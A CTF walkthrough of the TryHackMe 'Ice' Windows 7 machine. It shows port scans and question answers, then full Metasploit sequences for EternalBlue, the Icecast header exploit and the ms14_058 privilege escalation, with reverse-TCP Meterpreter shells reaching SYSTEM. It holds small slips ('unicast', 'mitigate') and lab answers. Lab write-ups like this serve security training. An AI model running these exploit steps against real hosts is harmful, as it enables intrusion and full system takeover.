# Machine Name = ICE  
# Machine IP = 10.114.153.177  

----
# Reconniance  
Search for open ports and versions:    
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ rustscan -a 10.114.153.177
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/home/faridd/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.114.153.177:135
Open 10.114.153.177:139
Open 10.114.153.177:445
Open 10.114.153.177:3389
Open 10.114.153.177:5357
Open 10.114.153.177:8000
Open 10.114.153.177:49152
Open 10.114.153.177:49154
Open 10.114.153.177:49153
Open 10.114.153.177:49160
Open 10.114.153.177:49166
Open 10.114.153.177:49167

┌──(faridd㉿Ferid)-[~/Downloads]
└─$ nmap -Pn -p135,139,445,5357,3389,8000 10.114.153.177 -sV -sC
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-18 16:03 +0400
Nmap scan report for 10.114.153.177
Host is up (0.076s latency).

PORT     STATE SERVICE        VERSION
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server?
5357/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp open  http           Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:be:26:a3:b5:d9 (unknown)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-18T12:04:26
|_  start_date: 2026-04-18T11:57:49
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-18T07:04:26-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.56 seconds
```
* Question: One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?    
Answer: **3389**  

* Question: What service did nmap identify as running on port 8000? (First word of this service)  
Answer: **icecast**  

* Question: What does Nmap identify as the hostname of the machine? (All caps for the answer)  
Answer: **Dark-PC**  

----
# Initial Access      
Just look at this line in the nmap results:    
```bash  
445/tcp  open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
When we search for **"Windows 7 Professional 7601 Service Pack 1 microsoft-ds exploit"** in google, we will see an exploit in there **"MS17-010"**    
Let's check it on msfconsole.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ msfconsole -q
msf > search ms17-010
msf > use 0
msf exploit(windows/smb/ms17_010_eternalblue) > show options
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.114.153.177
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.137.68
msf exploit(windows/smb/ms17_010_eternalblue) > show targets
msf exploit(windows/smb/ms17_010_eternalblue) > set target 1
msf exploit(windows/smb/ms17_010_eternalblue) > run
```
After waiting for 30 seconds approximately, we will be System admin:   
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
But lets try to make it by using another hard ways. By using the "Icecast Server" vulnerability as the TryHackMe CTF wants us to do.    

----
# Initial Access Method 2   

```bash
msf > search unicast
msf > use 0
msf exploit(windows/http/icecast_header) > show options
msf exploit(windows/http/icecast_header) > set RHOSTS 10.114.153.177
msf exploit(windows/http/icecast_header) > set LHOST tun0
msf exploit(windows/http/icecast_header) > run
```
And yeah, we got new meterpereter shell as **"Dark"** user with low privileges:  
```bash
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getpid
Current pid: 1992
meterpreter > 
```

Let's look at the processess in that system:   
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 356   692   TrustedInstaller.exe
 416   4     smss.exe
 544   536   csrss.exe
 584   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 788   692   sppsvc.exe
 820   692   svchost.exe
 888   692   svchost.exe
 936   692   svchost.exe
 1008  1848  powershell.exe
 1020  692   svchost.exe
 1056  692   svchost.exe
 1200  692   svchost.exe
 1320  1020  dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1332  1300  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1412  692   svchost.exe
 1468  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1508  544   conhost.exe
 1596  692   amazon-ssm-agent.exe
 1668  692   LiteAgent.exe
 1712  692   svchost.exe
 1764  820   WmiPrvSE.exe
 1848  692   Ec2Config.exe
 1900  1020  Defrag.exe
 1992  1332  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2068  692   vds.exe
 2444  692   SearchIndexer.exe
 2480  692   spoolsv.exe
 2704  692   svchost.exe
 2840  544   conhost.exe
 2904  692   svchost.exe

meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

1. Initial Access & Process Context  

When we exploited the Icecast2 service, our Meterpreter shell was birthed directly inside the Icecast2.exe process memory.  

    The Context: Since Icecast2.exe is an older 32-bit application, our initial session was an x86 (32-bit) session.

    The Limitation: Even though the target machine is x64 (64-bit), we were trapped inside a 32-bit "bubble" within a 64-bit environment.

2. The WOW64 Subsystem & The "Thunk Layer"  

Normally, a 32-bit program cannot run on a 64-bit OS because they "speak" different memory languages. Windows uses WOW64 (Windows 32-bit on Windows 64-bit) to bridge this gap.  

    The Emulator: WOW64 acts as a translator. It tells the 32-bit app: "Go ahead, act like you're on a 32-bit system. I will translate your requests for the 64-bit Kernel."

    The Thunk Layer (The Whitelist): This is the "Thunking" process. It is a strictly defined set of API translations.

        Standard requests (e.g., "Open this file") are translated and allowed.

        Exploitation requests (e.g., "Inject code into the Kernel") are often not in the translation dictionary.

    The Barrier: Because of this "Whitelist" (Thunk Layer), our 32-bit shell cannot directly interact with the 64-bit components of the OS. This blocks many Privilege Escalation (PrivEsc) exploits and prevents us from reading 64-bit memory spaces like lsass.exe.

3. The Migration Process: Why and How?  

To break free from the WOW64 limitations, we used the migrate command.  

    What happens during Migration? 1. Meterpreter looks for a target process (we chose taskhost.exe, which is x64).
    2. It allocates a new space in that target process's memory.
    3. It "injects" its own code into that space and starts a new thread.
    4. The old connection in Icecast2.exe is closed.

    The Result: We moved from an x86 process to a native x64 process. We are no longer being "translated" by WOW64. We are now "native citizens" of the 64-bit system.

4. Privilege Escalation (LPE)  

Now that we are in an x64 session, we have a clear path to the Kernel.  

    Local Exploit Suggester: We used this to identify ms14_058.

    The Final Strike: Because we are now in an x64 context, the exploit can successfully interact with the 64-bit Windows Kernel without being blocked by the WOW64 Thunk Layer.

    Outcome: We successfully escalated our privileges to NT AUTHORITY\SYSTEM.
  
```bash
meterpreter > migrate 1468
[*] Migrating from 1992 to 1468...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```
We simply used **"mitigate"** command to move on another proccess with x64 architecture. Now we can use the **local suggester**:

First of all, click **"CTRL+Z"** to throw this meterpereter session for Dark user to background. Then, do them:
```bash
Background session 2? [y/N]  
msf exploit(windows/http/icecast_header) > search suggester
msf exploit(windows/http/icecast_header) > use 0
msf post(multi/recon/local_exploit_suggester) > show options
msf post(multi/recon/local_exploit_suggester) > sessions -l
msf post(multi/recon/local_exploit_suggester) > set session 2
msf post(multi/recon/local_exploit_suggester) > run
```
It gave us several exploits and by the help of AI, I decided to use this one:   
```bash
exploit/windows/local/ms14_058_track_popup_menu
```
Let's do it:   
```bash
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_058_track_popup_menu
msf exploit(windows/local/ms14_058_track_popup_menu) > show options
msf exploit(windows/local/ms14_058_track_popup_menu) > sessions -l
msf exploit(windows/local/ms14_058_track_popup_menu) > set SESSION 2
SESSION => 2
msf exploit(windows/local/ms14_058_track_popup_menu) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Windows x86
    1   Windows x64

msf exploit(windows/local/ms14_058_track_popup_menu) > set target 1
msf exploit(windows/local/ms14_058_track_popup_menu) > set LHOST tun0
msf exploit(windows/local/ms14_058_track_popup_menu) > run

```
When I wrote show options, I saw that it was set as Windows x86 by default but remember that our system was x64-bits. So, I also set the target as x64.   
When I run it, I saw an error message:   
```bash
[-] Exploit failed: windows/meterpreter/reverse_tcp is not a compatible payload.
[*] Exploit completed, but no session was created.
```
It simply says that, We need to set the proper payload. And the correct payload for this exploit is **"windows/x64/meterpreter/reverse_tcp"** because we are trying to exploit x64 system right now.   
```bash
msf exploit(windows/local/ms14_058_track_popup_menu) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ms14_058_track_popup_menu) > run
[*] Started reverse TCP handler on 192.168.137.68:4444 
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 1564 launched.
[*] Reflectively injecting the DLL into 1564...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (232006 bytes) to 10.114.153.177
[*] Meterpreter session 3 opened (192.168.137.68:4444 -> 10.114.153.177:49234) at 2026-04-18 16:49:22 +0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
Bingoo!! We are System Administrator right now.  











